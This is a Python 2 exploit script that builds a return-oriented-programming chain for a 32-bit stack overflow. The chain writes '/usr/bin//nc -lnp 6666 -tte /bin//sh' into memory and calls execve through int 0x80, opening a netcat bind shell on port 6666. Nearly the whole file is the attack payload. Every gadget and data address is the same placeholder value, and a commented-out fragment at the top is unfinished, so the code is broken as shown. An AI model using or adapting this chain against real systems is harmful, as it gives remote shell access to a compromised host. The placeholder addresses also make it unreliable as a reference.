#from struct import pack
#p = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
#
#
#p += "\x62\x00\x00\x00"
#for i in range(3):
#    p += pack("<I", 0x00000000)
#    
#p +=  


#!/usr/bin/env python2
from struct import pack

EDAX0      = pack("<I", 0x0000000000400854)
STACK      = pack("<I", 0x0000000000400854) # .data 0x740   0x80c6620
INT80      = pack("<I", 0x0000000000400854) # int $0x80
MOVISTACK  = pack("<I", 0x0000000000400854) # mov %eax,(%ecx) | pop %ebp | ret
INCEAX     = pack("<I", 0x0000000000400854) # inc %eax | ret
POPALL     = pack("<I", 0x0000000000400854) # pop %edx | pop %ecx | pop %ebx | ret
POPEAX     = pack("<I", 0x0000000000400854) # pop %eax | pop %ebx | pop %esi | pop %edi | ret
XOREAX     = pack("<I", 0x0000000000400854) # xor %eax,%eax | ret
DUMMY      = pack("<I", 0x0000000000400854) # padding

buff  = "\x42" * 32
buff += "BBBB"

buff += POPALL              # it's via %ecx we will build our stack.
buff += DUMMY               # padding 
buff += STACK               # %ecx contain the stack address.
buff += DUMMY               # padding

buff += POPEAX              # Lets put content in an address
buff += "/usr"              # put "/usr" in %eax
buff += DUMMY               # padding 
buff += DUMMY               # padding 
buff += DUMMY               # padding 
buff += MOVISTACK           # put "/usr" in stack address
buff += DUMMY               # padding

buff += POPALL
buff += DUMMY               # padding 
buff += pack("<I", 0x0000000000400854 + 4)  # we change our stack for to point after "/usr"
buff += DUMMY               # padding

buff += POPEAX              # Applying the same for "/bin"
buff += "/bin"
buff += DUMMY               # padding 
buff += DUMMY               # padding 
buff += DUMMY               # padding 
buff += MOVISTACK           # we place "/bin" after "/usr"
buff += DUMMY               # padding

buff += POPALL
buff += DUMMY               # padding 
buff += pack("<I", 0x0000000000400854 + 8)  # we change our stack for to point after "/usr/bin"
buff += DUMMY               # padding

buff += POPEAX              # Applying the same for "//nc"
buff += "//nc"              
buff += DUMMY               # padding 
buff += DUMMY               # padding 
buff += DUMMY               # padding 
buff += MOVISTACK           # we place "//nc" after "/usr/bin"
buff += DUMMY               # padding

buff += POPALL
buff += DUMMY               # padding 
buff += pack("<I", 0x0000000000400854 + 13) # we change our stack for to point after "/usr/bin//nc"+1
                    # to leave a \0 between arguments
buff += DUMMY               # padding

# we repeated operation for each argument
buff += POPEAX
buff += "-lnp"
buff += DUMMY
buff += DUMMY
buff += DUMMY
buff += MOVISTACK
buff += DUMMY

buff += POPALL
buff += DUMMY
buff += pack("<I", 0x0000000000400854 + 18)
buff += DUMMY

buff += POPEAX
buff += "6666"
buff += DUMMY
buff += DUMMY
buff += DUMMY
buff += MOVISTACK
buff += DUMMY

buff += POPALL
buff += DUMMY
buff += pack("<I", 0x0000000000400854 + 23)
buff += DUMMY

buff += POPEAX
buff += "-tte"
buff += DUMMY
buff += DUMMY
buff += DUMMY
buff += MOVISTACK
buff += DUMMY

buff += POPALL
buff += DUMMY
buff += pack("<I", 0x0000000000400854 + 28)
buff += DUMMY

buff += POPEAX
buff += "/bin"
buff += DUMMY
buff += DUMMY
buff += DUMMY
buff += MOVISTACK
buff += DUMMY

buff += POPALL
buff += DUMMY
buff += pack("<I", 0x0000000000400854 + 32)
buff += DUMMY

buff += POPEAX
buff += "//sh"
buff += DUMMY
buff += DUMMY
buff += DUMMY
buff += MOVISTACK
buff += DUMMY

#
# We currently have our list of elements separated by \0
# Now we must construct our char **
#
# 0x80c6961 <_IO_wide_data_1+1>:     "/usr/bin//nc"
# 0x80c696e <_IO_wide_data_1+14>:    "-lnp"
# 0x80c6973 <_IO_wide_data_1+19>:    "6666"
# 0x80c6978 <_IO_wide_data_1+24>:    "-tte"
# 0x80c697d <_IO_wide_data_1+29>:    "/bin//sh"
# 0x80c6986 <_IO_wide_data_1+38>:    ""
#

buff += POPALL              
buff += DUMMY               # padding 
buff += pack("<I", 0x0000000000400854 + 60) # stack address
buff += DUMMY               # padding

buff += POPEAX
buff += pack("<I", 0x0000000000400854)      # @ of "/usr/bin//nc"
buff += DUMMY               # padding 
buff += DUMMY               # padding 
buff += DUMMY               # padding 
buff += MOVISTACK           # we place address of "/usr/bin//nc" in our STACK
buff += DUMMY               # padding

buff += POPALL
buff += DUMMY               # padding 
buff += pack("<I", 0x0000000000400854 + 64) # we shift our Stack Pointer + 4 for the second argument
buff += DUMMY               # padding

buff += POPEAX
buff += pack("<I", 0x0000000000400854)      # @ of "-lnp"
buff += DUMMY               # padding 
buff += DUMMY               # padding 
buff += DUMMY               # padding 
buff += MOVISTACK           # we place address of "-lnp" in our STACK
buff += DUMMY               # padding

buff += POPALL
buff += DUMMY               # padding 
buff += pack("<I", 0x0000000000400854 + 68) # we shift our Stack Pointer + 4 for the 3rd argument
buff += DUMMY               # padding

buff += POPEAX
buff += pack("<I", 0x0000000000400854)      # @ of "6666"
buff += DUMMY               # padding 
buff += DUMMY               # padding 
buff += DUMMY               # padding 
buff += MOVISTACK           # we palce address of "6666" in our STACK
buff += DUMMY               # padding

buff += POPALL
buff += DUMMY               # padding 
buff += pack("<I", 0x0000000000400854 + 72) # we shift our Stack Pointer + 4 for the 4th argument
buff += DUMMY               # padding

buff += POPEAX
buff += pack("<I", 0x0000000000400854)       # @ of "-tte"
buff += DUMMY               # padding 
buff += DUMMY               # padding 
buff += DUMMY               # padding 
buff += MOVISTACK           # we place address of "-tte" in our STACK
buff += DUMMY               # padding

buff += POPALL
buff += DUMMY               # padding 
buff += pack("<I", 0x0000000000400854 + 76) # we shift our Stack Pointer + 4 for the 5th argument
buff += DUMMY               # padding

buff += POPEAX
buff += pack("<I", 0x0000000000400854)       # @ of "/bin//sh"
buff += DUMMY               # padding 
buff += DUMMY               # padding 
buff += DUMMY               # padding 
buff += MOVISTACK           # we place address of "/bin//sh" in our STACK
buff += DUMMY               # padding

#
# Now we must implement eax to contain the address of 
# the execve syscall.
# execve = 0xb
#

buff += XOREAX                              # %eax is put to zero.
buff += INCEAX * 11                         # %eax is now 0xb
buff += POPALL                              # last pop 
buff += pack("<I", 0x0000000000400854 + 48)         # edx char *env
buff += pack("<I", 0x0000000000400854 + 60)         # ecx char **arguments
buff += pack("<I", 0x0000000000400854)              # ebx "/usr/bin//nc"
buff += INT80                               # we execute


print buff
